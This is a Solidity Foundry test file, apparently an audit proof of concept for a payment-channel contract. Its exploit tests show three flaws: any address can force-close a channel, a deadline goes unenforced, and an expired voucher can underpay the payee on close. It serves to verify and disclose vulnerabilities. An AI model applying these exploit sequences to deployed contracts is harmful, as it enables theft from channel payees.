// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import "@openzeppelin/contracts/token/ERC20/ERC20.sol";

// Minimal interface
interface ITempoStreamChannel {
    struct Channel {
        address payer;
        address payee;
        address authorizedSigner;
        address token;
        uint256 deposit;
        uint256 settled;
        uint256 gracePeriodEnd;
        bool finalized;
    }
    struct Voucher {
        bytes32 channelId;
        uint256 cumulativeAmount;
        uint256 nonce;
        uint256 expiry;
    }
    function openChannel(address, address, uint256, address, uint256) external returns (bytes32);
    function settle(Voucher calldata, bytes calldata) external;
    function initiateClose(bytes32) external;
    function finalize(bytes32) external;
    function close(Voucher calldata, bytes calldata, bytes calldata) external;
    function channels(bytes32) external view returns (
        address, address, address, address, uint256, uint256, uint256, bool
    );
    function getDomainSeparator() external view returns (bytes32);
    function VOUCHER_TYPEHASH() external view returns (bytes32);
}

contract MockToken is ERC20 {
    constructor() ERC20("Mock USD", "mUSD") {}
    function mint(address to, uint256 amount) external { _mint(to, amount); }
    function decimals() public pure override returns (uint8) { return 6; }
}

contract TempoStreamChannel_PoC is Test {
    ITempoStreamChannel channel;
    MockToken token;

    address payer;
    uint256 payerPK = 0xBEEF;
    address payee;
    uint256 signerPK = 0xA11CE;
    address signer;
    address attacker;

    uint256 constant DEPOSIT = 10_000e6;

    function setUp() public {
        // Deploy
        bytes memory code = vm.getDeployedCode(
            "TempoStreamChannel.sol:TempoStreamChannel"
        );
        // compile path workaround — deploy from source dir
        vm.etch(address(0xDEAD), hex"");
        address impl;
        bytes memory creationCode = abi.encodePacked(
            vm.getCode("TempoStreamChannel.sol:TempoStreamChannel")
        );
        assembly { impl := create(0, add(creationCode, 0x20), mload(creationCode)) }
        channel = ITempoStreamChannel(impl);

        token = new MockToken();

        payer   = vm.addr(payerPK);
        signer  = vm.addr(signerPK);
        payee   = makeAddr("payee");
        attacker = makeAddr("attacker");

        token.mint(payer, DEPOSIT * 3);
        vm.prank(payer);
        token.approve(address(channel), type(uint256).max);
    }

    // ─── H-01: Anyone can force-close any channel ─────────────────────────────

    /// @notice Control: normal close initiated by payer works
    function test_control_H01_payerCanInitiateClose() public {
        vm.prank(payer);
        bytes32 cid = channel.openChannel(payee, address(token), DEPOSIT, signer, block.timestamp + 1 hours);

        vm.prank(payer);
        channel.initiateClose(cid);

        (, , , , , , uint256 gpEnd, ) = channel.channels(cid);
        assertGt(gpEnd, 0, "Grace period should be set by payer");
    }

    /// @notice Exploit: random attacker force-closes payer's channel; payee loses access
    function test_exploit_H01_anyoneCanForceClose() public {
        vm.prank(payer);
        bytes32 cid = channel.openChannel(payee, address(token), DEPOSIT, signer, block.timestamp + 1 hours);

        uint256 payeeBefore = token.balanceOf(payee);

        // Attacker (unrelated party) triggers grace period
        vm.prank(attacker);
        channel.initiateClose(cid);  // should revert but doesn't

        (, , , , , , uint256 gpEnd, ) = channel.channels(cid);
        assertGt(gpEnd, 0, "Grace period set by attacker — unauthorized");

        // Advance past grace period
        vm.warp(block.timestamp + 1 hours + 1);

        // Anyone finalizes — payee gets nothing extra, payer gets full refund
        vm.prank(attacker);
        channel.finalize(cid);

        (, , , , , , , bool finalized) = channel.channels(cid);
        assertTrue(finalized, "Channel force-closed by attacker");

        // Payee received nothing — all deposit refunded to payer
        uint256 payeeGain = token.balanceOf(payee) - payeeBefore;
        assertEq(payeeGain, 0, "Payee earned nothing due to forced closure");

        uint256 payerBalance = token.balanceOf(payer);
        // payer started with DEPOSIT*3, spent DEPOSIT, got it back
        assertEq(payerBalance, DEPOSIT * 3, "Payer got full refund via attacker-forced closure");

        emit log_string("H-01 CONFIRMED: attacker force-closed channel with zero cost");
    }

    // ─── M-01: deadline parameter never enforced ──────────────────────────────

    /// @notice Exploit: transaction included after deadline passes — no revert
    function test_exploit_M01_deadlineNotEnforced() public {
        uint256 expiredDeadline = block.timestamp - 1;  // already past

        // This should revert with DeadlineExpired() but doesn't
        vm.prank(payer);
        bytes32 cid = channel.openChannel(payee, address(token), DEPOSIT, signer, expiredDeadline);

        assertTrue(cid != bytes32(0), "M-01 CONFIRMED: channel opened past deadline — no protection");
    }

    // ─── M-02: close() skips expiry + nonce checks ────────────────────────────

    function _signVoucher(ITempoStreamChannel.Voucher memory v, uint256 pk)
        internal view returns (bytes memory)
    {
        bytes32 domainSep = channel.getDomainSeparator();
        bytes32 typehash  = channel.VOUCHER_TYPEHASH();
        bytes32 structHash = keccak256(abi.encode(typehash, v.channelId, v.cumulativeAmount, v.nonce, v.expiry));
        bytes32 digest = keccak256(abi.encodePacked("\x19\x01", domainSep, structHash));
        (uint8 vv, bytes32 r, bytes32 s) = vm.sign(pk, digest);
        return abi.encodePacked(r, s, vv);
    }

    function _signClose(bytes32 cid, uint256 cumAmt, uint256 pk)
        internal pure returns (bytes memory)
    {
        bytes32 closeHash = keccak256(abi.encodePacked("CLOSE", cid, cumAmt));
        bytes32 closeDigest = keccak256(abi.encodePacked("\x19Ethereum Signed Message:\n32", closeHash));
        (uint8 vv, bytes32 r, bytes32 s) = vm.sign(pk, closeDigest);
        return abi.encodePacked(r, s, vv);
    }

    /// @notice Control: cooperative close with valid current voucher works correctly
    function test_control_M02_closeWithCurrentVoucher() public {
        vm.prank(payer);
        bytes32 cid = channel.openChannel(payee, address(token), DEPOSIT, signer, block.timestamp + 1 hours);

        ITempoStreamChannel.Voucher memory currentVoucher = ITempoStreamChannel.Voucher({
            channelId: cid,
            cumulativeAmount: 8000e6,
            nonce: 5,
            expiry: block.timestamp + 1 hours
        });

        bytes memory sig      = _signVoucher(currentVoucher, signerPK);
        bytes memory closeSig = _signClose(cid, 8000e6, payerPK);

        uint256 payeeBefore = token.balanceOf(payee);
        channel.close(currentVoucher, sig, closeSig);
        assertEq(token.balanceOf(payee) - payeeBefore, 8000e6, "Payee got correct amount");
    }

    /// @notice Exploit: payer closes with expired low-value voucher, underpaying payee
    function test_exploit_M02_staleVoucherUnderpaysPayee() public {
        vm.prank(payer);
        bytes32 cid = channel.openChannel(payee, address(token), DEPOSIT, signer, block.timestamp + 2 hours);

        // Old/expired voucher for 1000 — would fail in settle() due to expired timestamp
        ITempoStreamChannel.Voucher memory staleVoucher = ITempoStreamChannel.Voucher({
            channelId: cid,
            cumulativeAmount: 1000e6,
            nonce: 1,
            expiry: block.timestamp - 1  // already expired
        });

        // Payer colluding: signs both the stale voucher auth and close
        bytes memory sig      = _signVoucher(staleVoucher, signerPK);
        bytes memory closeSig = _signClose(cid, 1000e6, payerPK);

        // Payee should be owed 8000e6 (services rendered) but payer closes with 1000e6
        uint256 payeeBefore = token.balanceOf(payee);

        // close() accepts expired voucher — no revert
        channel.close(staleVoucher, sig, closeSig);

        uint256 payeeGot = token.balanceOf(payee) - payeeBefore;
        assertEq(payeeGot, 1000e6, "M-02 CONFIRMED: payee received only 1000 via expired voucher");
        // Payer got refund of 9000e6 instead of rightful 2000e6
        emit log_named_uint("Payer unfair refund", token.balanceOf(payer));
    }
}
